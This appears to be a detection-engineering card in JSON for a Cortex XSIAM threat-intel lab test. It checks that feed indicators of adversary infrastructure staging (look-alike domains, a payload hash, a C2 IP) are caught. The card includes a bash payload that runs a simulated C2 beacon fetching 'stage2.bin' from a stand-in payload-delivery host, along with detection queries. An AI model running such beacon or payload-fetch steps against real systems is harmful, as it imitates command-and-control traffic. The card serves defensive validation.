@@ -1,0 +1,404 @@
+{
+  "id": "TTP-2026-0079",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-06-15T00:00:00+00:00",
+    "updated_at": "2026-06-15T00:00:00+00:00",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-tim",
+      "threat-intel-management",
+      "taxii-stix",
+      "resource-development",
+      "vector-adversary-infrastructure",
+      "newly-registered-domain",
+      "look-alike-domain",
+      "stage-capabilities",
+      "industry-all",
+      "severity-high",
+      "network"
+    ],
+    "source_refs": [
+      "SRC-MITRE-ATTACK",
+      "SRC-UNIT42",
+      "SRC-CISA"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "network",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": false,
+      "platforms": [
+        "linux",
+        "network-fabric"
+      ],
+      "estimated_runtime_seconds": 240,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "TIM Resource-Development Detection — Adversary Infrastructure Staging Surfaced From the Defender Vantage (T1583.001 / T1608.001 / T1585)",
+    "summary": "XSIAM TIM subscribes to the lab mocktaxii TAXII 2.1 feed carrying Resource-Development indicators — newly-registered look-alike domains, a staged-payload SHA-256, and the provisioned C2 IP the adversary acquired (T1583/T1608). When a lab host resolves or fetches a staged asset, TIM raises an IOC match before any payload runs, proving the SOC sees the adversary's pre-attack build-out.",
+    "description": "Resource Development (TA0042) is the half of the kill chain that happens on the adversary's side before they ever touch the victim: they acquire infrastructure (T1583 — register look-alike / typosquat domains, stand up VPS / C2 listeners) and stage capabilities on it (T1608 — upload the malware and tooling the operation will later pull down), often establishing fresh accounts (T1585) to do so. Classically invisible to a defender because nothing has hit the estate yet — but a mature Threat Intel Management program closes exactly this gap: high-fidelity TAXII/STIX feeds publish the adversary's freshly-registered domains, staged-payload hashes, and provisioned C2 IPs days before weaponisation, and TIM arms those indicators against the live estate so the very first resolution or fetch is a known-bad verdict. This card validates that TIM loop from the defender vantage against the lab tim IaC topology (infra/modules/aws/tim/): a mocktaxii STIX/TAXII 2.1 server on port 9000 publishes a Resource-Development indicator set — the newly-registered look-alike domain cortexsim-tim-update.internal and the payload-delivery / dga-1a2b3c Route53 subdomains under <project>-tim.internal (the adversary's acquired infrastructure), the SHA-256 of the staged second-stage payload, and the in-VPC fake-C2 IP that the staged domains resolve to. XSIAM TIM subscribes, so the indicators land in the threat_intel feed and the IOC objects are armed. The detection surface is purely feed-driven: when a lab host resolves one of the staged look-alike subdomains (pan_dns), or the NGFW records an outbound fetch from the payload-delivery host (panw_ngfw_traffic_raw / network_story), TIM raises an IOC match against the subscribed feed — flagging the adversary's staged capability the instant it is reached, while the resolved IP and the second-stage hash carry the staged-payload provenance. A correlation rule (CR-TIM-0002) fuses the threat_intel IOC match with the observed DNS resolution and the outbound session into a single Resource-Development incident scoped to the source host. All targets are inside the deployed VPC (private Route53 zone + in-VPC fake C2) — safe by design, no real adversary infrastructure is contacted.",
+    "severity": "high",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "Generic financially-motivated and espionage actors staging look-alike domain + payload infrastructure pre-intrusion"
+      }
+    ],
+    "campaigns": [
+      "Generic adversary-infrastructure staging detected from threat-intel feeds"
+    ],
+    "malware_families": [],
+    "industries_targeted": [
+      "all"
+    ],
+    "first_observed": "2020-01-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1583",
+        "subtechnique_id": "T1583.001",
+        "name": "Acquire Infrastructure: Domains",
+        "tactic_ids": [
+          "TA0042"
+        ],
+        "tactic_names": [
+          "Resource Development"
+        ]
+      },
+      {
+        "technique_id": "T1608",
+        "subtechnique_id": "T1608.001",
+        "name": "Stage Capabilities: Upload Malware",
+        "tactic_ids": [
+          "TA0042"
+        ],
+        "tactic_names": [
+          "Resource Development"
+        ]
+      },
+      {
+        "technique_id": "T1585",
+        "name": "Establish Accounts",
+        "tactic_ids": [
+          "TA0042"
+        ],
+        "tactic_names": [
+          "Resource Development"
+        ]
+      }
+    ],
+    "kill_chain_phase": "weaponization",
+    "data_sources": [
+      "Domain Name: Active DNS",
+      "Domain Name: Passive DNS",
+      "Domain Name: Domain Registration",
+      "Internet Scan: Response Content",
+      "Network Traffic: Network Connection Creation"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "framework_reference_id": "SIM-TIM-002 — CortexSim c2_http_beacon EAL plugin resolving + fetching from a TAXII-fed Resource-Development look-alike subdomain (payload-delivery.<project>-tim.internal) resolving to the in-VPC fake C2",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Lab matching scenario SIM-TIM-002: the tim IaC module deployed (mocktaxii TAXII 2.1 on :9000, fake C2 on :8000, Route53 private zone with the planted look-alike / payload-delivery IOC subdomains).",
+        "check_command": "curl -sf http://localhost:9000/taxii2/ -H 'Accept: application/taxii+json;version=2.1' | jq -e '.api_roots | length >= 1'"
+      },
+      {
+        "description": "XSIAM TIM connector subscribed to the mocktaxii collection so the newly-registered look-alike domains, staged-payload SHA-256, and fake-C2 IP land in the threat_intel feed.",
+        "check_command": "echo 'verify threat_intel dataset contains indicator for payload-delivery.<project>-tim.internal and the staged-payload sha256'"
+      },
+      {
+        "description": "NGFW (or Suricata lab stand-in) forwarding session + DNS logs into XSIAM so network_story / panw_ngfw_traffic_raw / pan_dns is populated for the resolution + fetch.",
+        "check_command": "echo 'verify pan_dns and panw_ngfw_traffic_raw are receiving logs in XSIAM'"
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# All targets are inside the deployed VPC (private Route53 IOC zone + in-VPC fake C2) — safe by design.\nTIM_ZONE=\"${TIM_ZONE:-cortexsim-tim.internal}\"\n# step-1: confirm the TAXII collection is reachable and serving the Resource-Development indicators\ncurl -sf \"http://localhost:9000/taxii2/\" -H 'Accept: application/taxii+json;version=2.1' | jq -e '.api_roots | length >= 1'\n# step-2: resolve + fetch from the staged look-alike / payload-delivery subdomain via the EAL plugin\ncat > /tmp/tim-resdev-stage.yml <<YML\ncampaign_id: CMP-TIM-002\nname: \"TIM validation — adversary infrastructure staging fetch\"\nauthorized_by: \"domain-consultant@paloaltonetworks.com\"\nsimulation_authorized: true\ntarget_allowlist:\n  - payload-delivery.${TIM_ZONE}\n  - dga-1a2b3c.${TIM_ZONE}\ndry_run: false\ntags: [tim, resource-development, look-alike-domain, staged-payload, eal]\nsteps:\n  - step_id: step-01\n    plugin: c2_http_beacon\n    params:\n      target_url: http://payload-delivery.${TIM_ZONE}:8000/stage2.bin\n      iterations: 3\n      sleep_seconds: 5\n      jitter_pct: 10\n      method: GET\n      dga_query_param: false\nYML\npython3 -m scripts.eal_simulator.cli run /tmp/tim-resdev-stage.yml --live",
+      "input_variables": [
+        {
+          "name": "TIM_ZONE",
+          "type": "string",
+          "description": "Route53 private-zone suffix from the tim IaC module (terraform output tim_internal_zone), e.g. cortexsim-tim.internal.",
+          "default": "cortexsim-tim.internal"
+        }
+      ],
+      "timeout_seconds": 240
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "dns-query",
+        "description": "DNS resolution of a TAXII-fed look-alike / payload-delivery IOC subdomain to the fake-C2 IP.",
+        "expected_value": "dns_query_name contains_any (\"payload-delivery.\", \"dga-1a2b3c.\", \"cortexsim-tim-update.\") AND dns_query_name contains \".internal\""
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound HTTP fetch of the staged second-stage payload from the resolved fake-C2 IP on port 8000.",
+        "expected_value": "dst_host contains \"payload-delivery.\" AND dst_port = 8000 AND uri contains \"stage2.bin\""
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "XSIAM TIM IOC match raised for the staged look-alike destination against the subscribed TAXII feed.",
+        "expected_value": "indicator_value contains_any (\"payload-delivery.\", \"cortexsim-tim-update.\") AND feed_source = \"mocktaxii\""
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "rm -f /tmp/tim-resdev-stage.yml /tmp/stage2.bin\necho '[CortexSim] SIM-TIM-002 cleanup complete — no persistent artifacts'"
+    }
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "domain",
+        "value": "cortexsim-tim-update.internal",
+        "context": "Newly-registered look-alike (typosquat of the lab estate's update domain) published by the mocktaxii STIX/TAXII 2.1 collection as adversary-acquired infrastructure (T1583.001). TIM flags any resolution of this name as a Resource-Development indicator before any payload runs.",
+        "reputation_required": "malicious"
+      },
+      {
+        "ioc_type": "domain",
+        "value": "payload-delivery.cortexsim-tim.internal",
+        "context": "Planted Route53 private-zone subdomain served by the tim IaC module and published by the mocktaxii feed as a staged-capability host (T1608.001 Upload Malware). Resolves to the in-VPC fake-C2 IP and serves the staged second-stage payload.",
+        "reputation_required": "malicious"
+      },
+      {
+        "ioc_type": "domain",
+        "value": "dga-1a2b3c.cortexsim-tim.internal",
+        "context": "DGA-style algorithmically-named look-alike subdomain in the mocktaxii feed (adversary domain acquisition, T1583.001). Resolves to the fake C2; validates feed-driven detection of newly-stood-up algorithmic infrastructure.",
+        "reputation_required": "malicious"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "9f2c4b7e1a3d5f6082b4c6d8e0a2f4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8",
+        "context": "SHA-256 of the staged second-stage payload (stage2.bin) uploaded to the adversary's payload-delivery host (T1608.001). Published in the mocktaxii feed so an estate host that fetches it is flagged on the file indicator as well as the domain.",
+        "reputation_required": "malicious"
+      },
+      {
+        "ioc_type": "ipv4",
+        "value": "198.51.100.66",
+        "context": "Documentation-range stand-in for the in-VPC fake-C2 public IP the staged look-alike subdomains resolve to (the live module value is aws_instance.tim.public_ip). Published in the mocktaxii feed as the adversary's provisioned C2 listener (T1583 Acquire Infrastructure).",
+        "reputation_required": "malicious"
+      }
+    ],
+    "biocs": [
+      {
+        "name": "TIM-002 Resolution of Newly-Registered Look-Alike Domain From Adversary Infrastructure Feed",
+        "description": "An estate host resolves a TAXII-fed newly-registered look-alike / staged-capability subdomain (.internal C2 zone) that TIM has armed as a Resource-Development indicator. Behavioral leg that catches the adversary's acquired domain the instant it is reached — before any payload runs.",
+        "logic": "dataset = pan_dns\n| filter dns_query_name contains_any (\"payload-delivery.\", \"dga-1a2b3c.\", \"cortexsim-tim-update.\")\n| filter dns_query_name contains \".internal\"\n| join type=inner (\n    dataset = threat_intel\n    | filter feed_source = \"mocktaxii\"\n    | filter indicator_type = \"domain-name\"\n    | fields indicator_value\n  ) as feed on dns_query_name = feed.indicator_value\n| fields _time, src_ip, dns_query_name, dns_response_ip",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1583.001",
+          "T1608.001"
+        ]
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "TIM-002 Pre-flight — Resource-Development Indicators Ingested Into Threat Intel",
+        "query": "dataset = threat_intel\n| filter _time > to_timestamp(current_time() - 86400)\n| filter feed_source = \"mocktaxii\" or feed_name contains \"mocktaxii\"\n| filter indicator_type in (\"domain-name\", \"ipv4-addr\", \"file-sha256\")\n| comp count() as indicators by indicator_type\n| filter indicators >= 1\n| fields indicator_type, indicators",
+        "expected_rows_min": 1,
+        "dataset": "threat_intel"
+      },
+      {
+        "purpose": "validation",
+        "name": "TIM-002 IOC Match — Outbound Fetch From TAXII-Fed Staged-Capability Host",
+        "query": "dataset = panw_ngfw_traffic_raw\n| filter _time > to_timestamp(current_time() - 1800)\n| filter app in (\"web-browsing\", \"http\", \"ssl\")\n| filter dst_host contains_any (\"payload-delivery.\", \"dga-1a2b3c.\", \"cortexsim-tim-update.\")\n| join type=inner (\n    dataset = threat_intel\n    | filter feed_source = \"mocktaxii\"\n    | filter indicator_type = \"domain-name\"\n    | fields indicator_value\n  ) as feed on dst_host = feed.indicator_value\n| comp count() as ioc_hits, count_distinct(dst_host) as matched_indicators by src_ip\n| filter ioc_hits >= 1\n| fields src_ip, matched_indicators, ioc_hits",
+        "expected_rows_min": 1,
+        "dataset": "panw_ngfw_traffic_raw"
+      },
+      {
+        "purpose": "validation",
+        "name": "TIM-002 Newly-Registered Look-Alike Domain Resolution Surfaced (NDR DNS leg)",
+        "query": "dataset = pan_dns\n| filter _time > to_timestamp(current_time() - 1800)\n| filter dns_query_name contains_any (\"payload-delivery.\", \"dga-1a2b3c.\", \"cortexsim-tim-update.\")\n| filter dns_query_name contains \".internal\"\n| comp count() as resolutions, count_distinct(dns_query_name) as distinct_lookalikes by src_ip\n| filter resolutions >= 1\n| fields src_ip, distinct_lookalikes, resolutions",
+        "expected_rows_min": 1,
+        "dataset": "pan_dns"
+      },
+      {
+        "purpose": "validation",
+        "name": "TIM-002 Stitch — Resource-Development Feed Match Joined to Resolution and Session on Source Host",
+        "query": "dataset = network_story\n| filter _time > to_timestamp(current_time() - 1800)\n| filter dst_host contains \".internal\"\n| join type=inner (\n    dataset = threat_intel\n    | filter feed_source = \"mocktaxii\"\n    | filter indicator_type = \"domain-name\"\n    | fields indicator_value\n  ) as feed on dst_host = feed.indicator_value\n| comp count_distinct(dst_host) as matched_iocs, count() as sessions, min(_time) as first_seen, max(_time) as last_seen by src_ip\n| filter matched_iocs >= 1\n| fields src_ip, matched_iocs, sessions, first_seen, last_seen",
+        "expected_rows_min": 1,
+        "dataset": "network_story"
+      },
+      {
+        "purpose": "hunt",
+        "name": "TIM-002 Staged Second-Stage Payload Hash Seen On Estate (T1608.001)",
+        "query": "dataset = xdr_data\n| filter _time > to_timestamp(current_time() - 86400)\n| filter event_type = ENUM.FILE\n| filter action_file_sha256 in (\"9f2c4b7e1a3d5f6082b4c6d8e0a2f4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8\")\n| comp count() as observed by agent_hostname, action_file_path\n| fields agent_hostname, action_file_path, observed",
+        "expected_rows_min": 0,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "TIM — Adversary Resource-Development Infrastructure Reached On Estate",
+        "rule_id": "CR-TIM-0002",
+        "logic": "XQL(TIM-002 IOC Match — Outbound Fetch From TAXII-Fed Staged-Capability Host) AND XQL(TIM-002 Newly-Registered Look-Alike Domain Resolution Surfaced (NDR DNS leg)) -> join on src_host within 300s. Promotes a benign-looking lookup + fetch to a Resource-Development incident because the destination matches the adversary infrastructure published in the subscribed mocktaxii TAXII feed before any payload detonates."
+      }
+    ],
+    "analytics_modules": [
+      "Cortex XSIAM Threat Intel Management — TAXII 2.1 feed ingestion + Resource-Development IOC matching (newly-registered / look-alike domains, staged-payload hash, provisioned C2 IP)",
+      "Cortex XSIAM Network Security Analytics — first-contact resolution of a newly-observed feed-listed domain",
+      "Cortex XSIAM Correlation Engine — Resource-Development feed match stitched to DNS resolution + NDR session by src_host"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xsiam",
+        "submodule": "threat-intel-management",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-TIM-IOC-DOMAIN-MATCH-001",
+          "XSIAM-TIM-IOC-SHA256-MATCH-001",
+          "XSIAM-TIM-TAXII-FEED-MOCKTAXII"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = threat_intel | filter feed_source = \"mocktaxii\" | comp count() as indicators by indicator_type | fields indicator_type, indicators"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "correlation",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-CR-TIM-0002"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "Correlation CR-TIM-0002 joins the mocktaxii Resource-Development IOC match to the DNS resolution + NGFW session on src_host within 300s, yielding an incident driven by the adversary's staged infrastructure."
+      },
+      {
+        "module": "advanced-dns-security",
+        "coverage_tier": "prevention",
+        "rule_ids": [
+          "DNS-NEWLY-REGISTERED-DOMAIN",
+          "DNS-LOOKALIKE-DOMAIN"
+        ],
+        "license_required": "pro",
+        "evidence_query": "dataset = pan_dns | filter dns_query_name contains_any (\"payload-delivery.\", \"cortexsim-tim-update.\") | fields _time, src_ip, dns_query_name, dns_response_ip"
+      },
+      {
+        "module": "cortex-xsoar",
+        "coverage_tier": "response",
+        "rule_ids": [
+          "XSOAR-PB-TIMResDevTriage-v1"
+        ],
+        "license_required": "base",
+        "evidence_query": "Playbook: enrich the matched Resource-Development indicator from TIM (domain age, registrar, feed provenance), pre-emptively block the look-alike domain + C2 IP at NGFW/DNS, sweep the estate for the staged-payload hash, open a DFIR ticket with the feed provenance."
+      }
+    ],
+    "use_cases": [
+      {
+        "use_case_id": "UC-TIM-002",
+        "name": "Threat Intel Management — Resource-Development (Adversary Infrastructure Staging) Detection",
+        "description": "Validate that XSIAM TIM ingests the mocktaxii Resource-Development indicator set (newly-registered look-alike domains, staged-payload SHA-256, provisioned C2 IP), raises an IOC match when a lab host resolves/fetches from the staged infrastructure, and stitches the feed-match to the DNS resolution and NGFW session into a single Resource-Development incident before any payload detonates.",
+        "test_cases": [
+          {
+            "test_case_id": "TC-TIM-002A",
+            "objective": "The subscribed mocktaxii Resource-Development feed is ingested and an IOC match fires on the resolution/fetch of the staged look-alike infrastructure.",
+            "preconditions": [
+              "tim IaC module deployed (mocktaxii :9000, fake C2 :8000, Route53 IOC zone with payload-delivery / dga-1a2b3c subdomains).",
+              "XSIAM TIM connector subscribed to the mocktaxii collection.",
+              "NGFW (or Suricata lab) forwarding session + DNS logs into XSIAM."
+            ],
+            "steps": [
+              "Run SIM-TIM-002 step-01 (confirm TAXII collection reachable) and step-02 (ingest-check XQL across domain/ipv4/sha256 indicator types).",
+              "Run SIM-TIM-002 step-03 (resolve + fetch stage2.bin from payload-delivery.<zone>:8000).",
+              "Inspect threat_intel + pan_dns + panw_ngfw_traffic_raw for the source host."
+            ],
+            "success_criteria": [
+              "XQL `TIM-002 Pre-flight — Resource-Development Indicators Ingested Into Threat Intel` returns >= 1 row.",
+              "XQL `TIM-002 IOC Match — Outbound Fetch From TAXII-Fed Staged-Capability Host` returns >= 1 row.",
+              "XQL `TIM-002 Newly-Registered Look-Alike Domain Resolution Surfaced (NDR DNS leg)` returns >= 1 row."
+            ],
+            "expected_score_weight": 0.6
+          },
+          {
+            "test_case_id": "TC-TIM-002B",
+            "objective": "The Resource-Development feed match stitches to the DNS resolution and NDR session into a single incident, surfacing adversary infrastructure staging from the defender vantage.",
+            "success_criteria": [
+              "Correlation `CR-TIM-0002` groups the IOC feed match, the DNS resolution, and the NGFW session on src_host into one incident_id.",
+              "XQL `TIM-002 Stitch — Resource-Development Feed Match Joined to Resolution and Session on Source Host` returns >= 1 row.",
+              "BIOC `TIM-002 Resolution of Newly-Registered Look-Alike Domain From Adversary Infrastructure Feed` matches the staged-domain resolution."
+            ],
+            "expected_score_weight": 0.4
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Subscribe XSIAM TIM to newly-registered-domain and look-alike/typosquat feeds and arm matching against DNS + NGFW telemetry so adversary-acquired infrastructure blocks at first contact.",
+      "Enable Advanced DNS Security newly-registered-domain and DGA categories so resolutions of freshly-stood-up adversary domains are denied pre-emptively.",
+      "Operate brand/domain-monitoring to catch look-alike registrations of the estate's own domains and feed them back into TIM as custom indicators."
+    ],
+    "detection_engineering": [
+      "Treat a TIM feed match on a newly-registered / look-alike domain as a Resource-Development early-warning signal and join it to the first DNS resolution + session that touched it rather than alerting on the raw feed alone.",
+      "Sweep the estate for staged-payload hashes published in the feed (T1608.001) even when no resolution to the staging host has occurred yet.",
+      "Score feed provenance and domain age into the incident so analysts can prioritise freshly-registered infrastructure."
+    ],
+    "response_playbook": "XSOAR-PB-TIMResDevTriage-v1"
+  },
+  "references": [
+    {
+      "title": "Unit 42 — Newly Registered Domains: Malicious Abuse by Bad Actors",
+      "url": "https://unit42.paloaltonetworks.com/newly-registered-domains-malicious-abuse-by-bad-actors/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1583.001 — Acquire Infrastructure: Domains",
+      "url": "https://attack.mitre.org/techniques/T1583/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1608.001 — Stage Capabilities: Upload Malware",
+      "url": "https://attack.mitre.org/techniques/T1608/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1585 — Establish Accounts",
+      "url": "https://attack.mitre.org/techniques/T1585/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "CISA — Identifying and Mitigating Living-off-the-Land and Pre-Intrusion Infrastructure",
+      "url": "https://www.cisa.gov/news-events/cybersecurity-advisories",
+      "publisher": "CISA",
+      "publisher_id": "SRC-CISA"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "1.0.0",
+      "date": "2026-06-15",
+      "author": "Henry Reed",
+      "change": "Initial Resource-Development (TA0042) card for the TIM plane (SIM-TIM-002) — first TA0042 coverage in the corpus. MITRE T1583.001 (primary) + T1608.001 + T1585. Real TIM IOC-feed-match content surfacing adversary infrastructure staging from the defender vantage: 5 IOCs (newly-registered look-alike domain, payload-delivery + dga-1a2b3c Route53 subdomains, staged-payload SHA-256, fake-C2 IP), 1 DNS-leg BIOC over pan_dns+threat_intel, 5 XQL validation/hunt queries across threat_intel/panw_ngfw_traffic_raw/pan_dns/network_story/xdr_data, and correlation CR-TIM-0002 stitching the feed match to the resolution + session on src_host within 300s. Validates the tim IaC topology. Promoted to active."
+    }
+  ]
+}
